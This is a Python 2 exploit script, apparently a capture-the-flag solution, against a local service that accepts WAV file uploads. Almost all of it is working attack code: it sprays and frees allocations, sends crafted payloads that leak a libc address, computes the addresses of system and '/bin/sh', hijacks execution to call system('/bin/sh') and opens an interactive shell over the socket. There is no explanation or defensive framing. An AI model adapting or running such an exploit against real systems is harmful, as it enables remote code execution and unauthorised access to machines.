import struct
import fft
import socket
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def pad(name, length, body):
    readuntil(f, "Exit\n#################################################\n")
    f.write("1\n")
    readuntil(f, "name: ")
    f.write("memeda" + name + "\n")
    readuntil(f, "format): ")

    wav = (
    "\x52\x49\x46\x46" #RIFF
    "\x00\x00\x00\x00"
    "\x57\x41\x56\x45" #WAVE
    "\x66\x6d\x74\x20" #fmt
    "\x10\x00\x00\x00" #0x10
    "\x01\x00" #1
    "\x01\x00" #2
    "\x80\x3e\x00\x00" #16000
    "\x80\x3e\x00\x00" #ByteRate
    "\x01\x00" #BlockAlign
    "\x08\x00" #BitPerSample
    "\x64\x61\x74\x61" #data
    )

    wav += p(length)
    wav += body
    wsize = p(len(wav))
    f.write(wsize + wav + "\n")

def dell(x):
    readuntil(f, "Exit\n#################################################\n")
    f.write("3\n")
    readuntil(f, "name: ")
    f.write("memeda" + x + "\n")

def getbyte(x):
    return "".join(map(fft.get_byte, map( ord, list(p(x)) ) ))

host = 'localhost'
port = 12345

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

for x in range(0, 176):
    pad(str(x), 0, "")

_print = 0x8048900
payload = fft.get_byte(0x42) * 12 + fft.get_byte(0x43) * 8 + fft.get_byte(0x57) * 24
payload += getbyte(_print) + getbyte(0x080493F0) + getbyte(1) + getbyte(0x0804A4B5) + getbyte(0x0804b118)

pad("", len(payload) / 800 * 400, payload)

dell("")

for x in range(0, 176):
    dell(str(175 - x))

pad("l0ve", 43200, "")

readuntil(f, "Account ")
read_addr = up(f.read(4))
print "[!]read_address: " + hex(read_addr)
libc_base = read_addr - 0xdb6f0
print "[!]libc_base_address: " + hex(libc_base)

sh = libc_base + 0x1615a4
system = libc_base + 0x403b0
print "[!]sh_address: " + hex(sh)
print "[!]system_address: " + hex(system)

dell("l0ve")

for x in range(0, 176):
    pad(str(x), 0, "")

payload = fft.get_byte(0x42) * 12 + fft.get_byte(0x43) * 8 + fft.get_byte(0x57) * 24
payload += getbyte(system) + getbyte(0x41414141) + getbyte(sh)

pad("", len(payload) / 800 * 400, payload)
dell("")
for x in range(0, 176):
    dell(str(175 - x))

pad("l0ve", 40000, "")

print "[!]Getting a shell......"
f.write("python -c 'import pty; pty.spawn(\"/bin/sh\")'\n")
t = telnetlib.Telnet()
t.sock = s
t.interact()








